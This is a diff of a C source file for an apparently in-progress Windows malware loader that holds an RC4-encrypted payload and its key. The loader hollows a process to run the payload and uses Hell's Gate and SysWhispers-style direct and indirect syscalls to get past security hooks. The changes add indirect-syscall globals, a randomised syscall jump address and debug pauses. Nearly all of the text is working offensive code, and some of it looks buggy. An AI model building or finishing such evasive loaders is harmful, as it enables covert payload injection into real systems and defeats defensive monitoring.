@@ -2,7 +2,7 @@
 #include "Syswhispers.h"
 #include <Windows.h>
 #include <stdio.h>
-
+#include "assembly.h"
 
 //Hells Gate Additions
 typedef struct _VX_TABLE_ENTRY {
@@ -124,6 +124,8 @@ unsigned char Rc4CipherText[] = {
         0xFE, 0x79, 0x38, 0x3A, 0x8F, 0x99, 0x2D, 0x20, 0x40, 0x91, 0x56, 0x0F, 0xD7, 0x70, 0x79, 0xC6,
         0x8C, 0xBB, 0x82, 0x28, 0xAC };
 
+DWORD gSSN = 0;
+PVOID gJMP = NULL;
 
 unsigned char Rc4Key[] = {
         0xAD, 0x09, 0x40, 0xE9, 0x73, 0xF5, 0x00, 0x57, 0x5D, 0xD8, 0xAE, 0x89, 0x53, 0x8E, 0x05, 0x5D };
@@ -170,9 +172,14 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     printf("Base Address: 0x%p\n", BaseAddress);
-    getchar();
+    //getchar();
+    printf("Starting NoahRead\n");
+    //getchar();
+
     //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
+    printf("Enging NoahRead\n");
+
     printf("Proc Address: 0x%p", procAddr);
     getchar();
     uintptr_t executableAddress = *((uintptr_t*)procAddr);//
@@ -581,11 +588,14 @@ BOOL GetVXTableEntry(DWORD dwDLLSize,PVOID* pSystemCalls ,PVOID pModuleBase, PIM
 
 
 
-EXTERN_C DWORD GetSSN(DWORD input) {
+EXTERN_C DWORD GetSSN(DWORD input){ 
     printf("%d\n", input);
+    getchar();
     if (input == 0) {
         printf("Wow! Read Syscall Getter called: %d\n",VxTable.Read.wSystemCall);
-        
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Read.wSystemCall;
+        getchar();
         return (DWORD)VxTable.Read.wSystemCall;
     }
     else if (input == 1) {
@@ -594,17 +604,19 @@ EXTERN_C DWORD GetSSN(DWORD input) {
     else if (input == 2) {
         return VxTable.Allocate.wSystemCall;
     }
+    return (DWORD)VxTable.Read.wSystemCall;
 }
 
-EXTERN_C PVOID GetJMP() {
-    getchar();
+EXTERN_C QWORD GetJMP() {
     printf("Now would be a good time to check rax for the syscall value...\n");
-
-    //PVOID address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
-    PVOID address = (PVOID)(0xdeadbeef);
-    printf("Getting JMP! 0x%p\n", address);
     getchar();
-    return &address;
+    PVOID address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
+    //PVOID address = (PVOID)(0xdeadbeef);
+    printf("Getting JMP! 0x%p\n", address);
+    gJMP = address;
+    getchar();
+    // return address;
+    return address;
 }
     
 
